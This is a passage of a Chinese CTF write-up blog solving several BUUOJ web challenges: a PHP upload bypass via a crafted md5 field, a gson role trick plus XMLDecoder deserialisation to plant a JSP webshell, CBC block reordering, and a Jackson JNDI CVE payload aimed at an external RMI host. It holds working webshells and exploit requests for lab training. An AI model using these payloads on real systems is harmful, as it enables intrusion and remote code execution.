class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这一部分文件上传乍一看没什么问题，<code>strtolower($ext) == &#39;php&#39; || !in_array($ext, explode(&#39;,&#39;, strtolower(sysconf(&#39;storage_local_exts&#39;)</code>使用了白名单认证，无懈可击，但是我们但凡往后跟几步就会发现不对劲。之后调用<code>move</code>函数保存文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685717634143-2fa23900-245a-432a-a904-3ccb955949ba.png#averageHue=%23252727&clientId=ua603f174-7f57-4&from=paste&height=556&id=u2a386de2&originHeight=695&originWidth=1429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=87496&status=done&style=none&taskId=u84508731-c8d7-4b65-9e24-403c96f3aef&title=&width=1143.2" alt="image.png"><br>会调用<code>buildSaveName</code>保存文件，因此跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685717649316-2d020722-87f3-450e-88c1-7c00ca9d5e14.png#averageHue=%23242726&clientId=ua603f174-7f57-4&from=paste&height=721&id=u502b91c6&originHeight=901&originWidth=1541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=176094&status=done&style=none&taskId=ua7993056-b5e7-4332-915f-bef7a135af9&title=&width=1232.8" alt="image.png"><br>注意<code>if (!strpos($savename, &#39;.&#39;))</code>，如果我们上传的md5后半段有<code>.</code>的话，那就直接返回了。也就是说假如md5为<code>ab61ae319127e259d05926783c3c.php</code>那就可以上传php文件了。<br>根据上图的处理，这个框架的上传流程如下</p>
<ul>
<li>文件名检验，后缀名白名单检验</li>
<li>根据md5生成token</li>
<li>将32位的md5拆成2份16位，前一半为文件夹后一半为文件名</li>
</ul>
<p>因此很容易发现md5处存在破绽。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/plugs/upstate.html HTTP/1.1</span><br><span class="line">Host: adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 77</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81</span><br><span class="line">Referer: http://adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81/admin/plugs/upfile.html?mode=one&amp;uptype=&amp;type=ico,png&amp;field=browser_icon</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: s7466e88d=c1e9af38ce9c1d7ed154e84a55cbfb20; menu-style=full; m-2-4=2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">id=WU_FILE_0&amp;md5=ab61ae319127e259d05926783c3c.php&amp;uptype=local&amp;filename=1.png</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685717772901-f35a1238-194f-435a-9a6f-c7fa3045e901.png#averageHue=%232b2b2b&clientId=ua603f174-7f57-4&from=paste&height=331&id=udd5a0122&originHeight=414&originWidth=1031&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36573&status=done&style=none&taskId=ufe5633db-95f9-41b4-ab86-a49067e53a6&title=&width=824.8" alt="image.png"><br>获取token后上传文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/plugs/upload.html HTTP/1.1</span><br><span class="line">Host: adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 1457</span><br><span class="line">X_Requested_With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81</span><br><span class="line">Referer: http://adfe451a-76ff-4d5e-8f3a-ced04e214cdd.node4.buuoj.cn:81/admin/plugs/upfile.html?mode=one&amp;uptype=&amp;type=ico,png&amp;field=browser_icon</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: s7466e88d=c1e9af38ce9c1d7ed154e84a55cbfb20; menu-style=full; m-2-4=2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;OSSAccessKeyId&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;success_action_status&quot;</span><br><span class="line"></span><br><span class="line">200</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">WU_FILE_0</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">fuck.png</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">image/png</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastModifiedDate&quot;</span><br><span class="line"></span><br><span class="line">Sat Feb 18 2023 18:15:42 GMT+0800 (中国标准时间)</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;size&quot;</span><br><span class="line"></span><br><span class="line">1488463</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;allowed_types&quot;</span><br><span class="line"></span><br><span class="line">ico|png</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;token&quot;</span><br><span class="line"></span><br><span class="line">2d46b41f0eee1ed839c81c70a5ccbb0f</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;md5&quot;</span><br><span class="line"></span><br><span class="line">ab61ae319127e259d05926783c3c.php</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;key&quot;</span><br><span class="line"></span><br><span class="line">ab61ae319127e259/d05926783c3ca4cb.png</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;fuck.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF80a</span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">------WebKitFormBoundarysFVw5vBe8UwX86uJ--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685717783542-8e0ca31e-587b-427b-bf83-47c5bbd51981.png#averageHue=%232c2c2c&clientId=ua603f174-7f57-4&from=paste&height=920&id=uffd7de01&originHeight=1150&originWidth=2418&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=207844&status=done&style=none&taskId=u3fb6a69d-d21d-4903-a1b3-2dff7ba4d68&title=&width=1934.4" alt="image.png"><br>虽然显示上传失败，但是实际上是成功了的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685717803627-16093b64-967f-4bd7-83bf-9526149ce3a7.png#averageHue=%23cccccc&clientId=ua603f174-7f57-4&from=paste&height=1114&id=u06ab2aca&originHeight=1392&originWidth=1930&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63570&status=done&style=none&taskId=ub47a9ef4-8261-4179-a8c5-f7bd2a85a58&title=&width=1544" alt="image.png"></p>
<h1 id="GKCTF-2021-babycat"><a href="#GKCTF-2021-babycat" class="headerlink" title="[GKCTF 2021]babycat"></a>[GKCTF 2021]babycat</h1><p>考点：任意文件读取、gson特性、xmldecode反序列化<br>虽然提示了不让注册，但是前端js泄露了信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685780889053-55f56091-3973-41b5-87d4-2961a3717f46.png#averageHue=%23fbfbfb&clientId=ubb8544ac-69bc-4&from=paste&height=518&id=u83c52b70&originHeight=648&originWidth=1320&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32882&status=done&style=none&taskId=u2ea98bb1-271a-4a05-b293-d625c9c05d8&title=&width=1056" alt="image.png"><br>我们依然可以注册，注册后会有个任意文件读取，tomcatweb服务的任意读取点如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">src</span>/：源码目录，按照包名结构放置各个<span class="title">java</span>文件。</span></span><br><span class="line"><span class="class">/<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">database</span>.<span class="title">properties</span>：数据库配置文件</span></span><br></pre></td></tr></table></figure>
<p>我们可以读取class文件，然后在注册发现如下敏感代码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685780935627-2cca675c-cd62-4005-8902-bfbede92887c.png#averageHue=%232d4166&clientId=ubb8544ac-69bc-4&from=paste&height=713&id=u66f15a00&originHeight=891&originWidth=1319&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1545429&status=done&style=none&taskId=u2e53e33b-6b44-4378-9ba4-b56311b9e49&title=&width=1055.2" alt="image.png"><br>首先该json是用gson解析的，并且发现它会对我们json里的<code>role:xxx</code>替换，将xxx替换为guest，也就是不让我们注册管理员账号，因为后台有个上传页面是需要admin权限的<br>因此这里有2种方法去绕过，gson是支持注释符功能的<br>第一种：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;role&quot;:&quot;guest&quot;,&quot;role&quot;:/**/&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>这一种让最后的<code>role:admin</code>不被识别替换，又由于json的特性，当有重名变量时，后者覆盖前者，因此这样可以注册admin账号。<br>第二种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&quot;123456&quot;,&quot;role&quot;:&quot;admin&quot;/*,&quot;role&quot;:&quot;test&quot;*/&#125;</span><br></pre></td></tr></table></figure>
<p>后面的role用注释包裹了，因此gson解析时不识别，然后由于正则识别的为最后一个role，因此同样也绕过了<br>那么可以上传文件了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685781394067-5c3d114e-c9a2-4283-b2b4-bdd846b2087c.png#averageHue=%23bdc7c0&clientId=ubb8544ac-69bc-4&from=paste&height=584&id=u2d0ea57d&originHeight=730&originWidth=1808&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37724&status=done&style=none&taskId=u2d1653e8-628d-4eee-b9e9-f3b0742b59c&title=&width=1446.4" alt="image.png"><br>结合前面获取的路径位置，我们可以往static目录下送一个jsp马，但是不能直接上传，这里要配合Xmldecoder进行解码，读出来的basedao.class里面有关注册的流程中，会读取db&#x2F;db.xml文件，所以我们直接上传一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /home/upload HTTP/1.1</span><br><span class="line">Host: 6b8a4d8d-bdda-4e8c-b670-ce37b27148ce.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 700</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://6b8a4d8d-bdda-4e8c-b670-ce37b27148ce.node4.buuoj.cn:81</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytu7QLqA1Nths7FbO</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://6b8a4d8d-bdda-4e8c-b670-ce37b27148ce.node4.buuoj.cn:81/home/upload</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: JSESSIONID=CFFD13F828BC114DCB8B340C66B17EE6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytu7QLqA1Nths7FbO</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../db/db.xml&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;java version=&quot;1.8.0_192&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">        &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/boogipop.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">        &lt;string&gt;&lt;![CDATA[`&lt;% javax.script.ScriptEngineManager manager = new javax.script.ScriptEngineManager(null);javax.script.ScriptEngine engine = manager.getEngineByName(&quot;js&quot;);engine.eval(request.getParameter(&quot;boogipop&quot;)); %&gt;`</span><br><span class="line">]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">    &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">------WebKitFormBoundarytu7QLqA1Nths7FbO--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后随便注册一个账号触发流程，写入小马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685783118360-bd7883f7-76ec-472d-83f0-5022de588534.png#averageHue=%23d5d5d5&clientId=u7c8661c8-1334-4&from=paste&height=1052&id=u2792ad54&originHeight=1315&originWidth=2581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80485&status=done&style=none&taskId=uf34e7ca4-d71d-4633-910b-c5635fb3f1c&title=&width=2064.8" alt="image.png"><br>反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685783136593-f42ffaa2-24f8-4036-a6bd-d78bbfbbb66c.png#averageHue=%23747372&clientId=u7c8661c8-1334-4&from=paste&height=558&id=u134a66f5&originHeight=698&originWidth=1071&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68434&status=done&style=none&taskId=u707c724d-c66e-452d-9eb1-f89e51a3b1b&title=&width=856.8" alt="image.png"><br>拿下flag，这道题做起来总的来说还是比较不错的，难度也感觉挺适中的，长见识了，xmldecode反序列化可以参考<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248771#h2-1">https://www.anquanke.com/post/id/248771#h2-1</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/10565968.html">https://www.cnblogs.com/peterpan0707007/p/10565968.html</a></p>
<h1 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h1><p>考点：CBC分组加密<br>注册一个账号后你可以发现一个长度很有规律的md5，大概长<br><code>6cdb3e0b9a235cebc0bb4b9a3024f92ac4699d493842933c72b7010b58c8fad566272da8c501b02fce26ba8a551896152d2772665d216e5f77e3148cbdf8d7663cb01163c2d2823f94b057834efec0ff</code><br>这就是本题的payload，一共160个字，也就是32一组，这就该联想到CBC分组加密了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685871110000-0df65196-6d73-46db-93c6-2a2bc18ae9f4.png#averageHue=%23ab8c5b&clientId=u63e5015a-741f-4&from=paste&height=209&id=u241aba20&originHeight=261&originWidth=1057&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18464&status=done&style=none&taskId=ufc60542e-c93d-40d1-b82f-4c5ffb63d41&title=&width=845.6" alt="image.png"><br>他需要我们cookie里的is_admin是0，我们只需要注册时发送的json如下<br><code>&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</code><br>这样分组之后情况如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;p</span><br><span class="line">aww&quot;,&quot;is_admin&quot;:</span><br><span class="line">0&#125;</span><br></pre></td></tr></table></figure>
<p>我们只需要把第二组放到倒数第二组，最后结果就变成<code>&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</code><br>这样就可以获取上述截图中的flag，其实就是一道密码题</p>
<h1 id="红明谷CTF-2021-JavaWeb"><a href="#红明谷CTF-2021-JavaWeb" class="headerlink" title="[红明谷CTF 2021]JavaWeb"></a>[红明谷CTF 2021]JavaWeb</h1><p>考点：JackSon反序列化CVE、Shiro权限绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685874088511-aa71dbff-31a1-4a8d-8f44-99ba9c5b7932.png#averageHue=%23fcfbfb&clientId=u065f61c8-1fc8-4&from=paste&height=546&id=u93d0984f&originHeight=683&originWidth=1197&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75087&status=done&style=none&taskId=uda3a989e-40fd-4740-94e9-37452db2e45&title=&width=957.6" alt="image.png"><br>先绕过一下鉴权，然后发送报错包，可以看到是jackson，这里随便掏一个cve来打。<br>CVE-2019-14439<br><code>[&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;rmi://114.116.119.253:1099/3l73zp&quot;&#125;]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685874140877-4d46b3c3-18a1-4827-ba8b-e731e2fc3efa.png#averageHue=%232b2724&clientId=u065f61c8-1fc8-4&from=paste&height=211&id=u0132ded1&originHeight=264&originWidth=665&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40897&status=done&style=none&taskId=ue229b20d-6d99-4dd5-a78d-f9f076f4388&title=&width=532" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685874146490-4abf5061-88b6-4d9c-85a0-06aa77e4133b.png#averageHue=%23393836&clientId=u065f61c8-1fc8-4&from=paste&height=94&id=u7fae8157&originHeight=117&originWidth=475&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6717&status=done&style=none&taskId=u41ca484f-abd9-4213-b86d-9170e89c79d&title=&width=380" alt="image.png"></p>
<h1 id="FBCTF2019-Products-Manager"><a href="#FBCTF2019-Products-Manager" class="headerlink" title="[FBCTF2019]Products Manager"></a>[FBCTF2019]Products Manager</h1><p>考点：mysql 空格 绕过 比较<br>初步判断为SQL二次注入<br>判断个勾八，这题考的是个trick，不难。。。<br>db.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES(&#x27;facebook&#x27;, sha256(....), &#x27;FLAG_HERE&#x27;);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES(&#x27;messenger&#x27;, sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES(&#x27;instagram&#x27;, sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES(&#x27;whatsapp&#x27;, sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES(&#x27;oculus-rift&#x27;, sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;config.php&quot;</span>); <span class="comment">// DB config</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$MYSQL_HOST</span>, <span class="variable">$MYSQL_USERNAME</span>, <span class="variable">$MYSQL_PASSWORD</span>, <span class="variable">$MYSQL_DBNAME</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;connect_error) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$db</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_errors</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$var</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Error. Please contact administrator.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_top_products</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&quot;SELECT name FROM products LIMIT 5&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="variable">$products</span> = [];</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="variable">$product</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$products</span>, <span class="variable">$product</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$products</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span>(<span class="params"><span 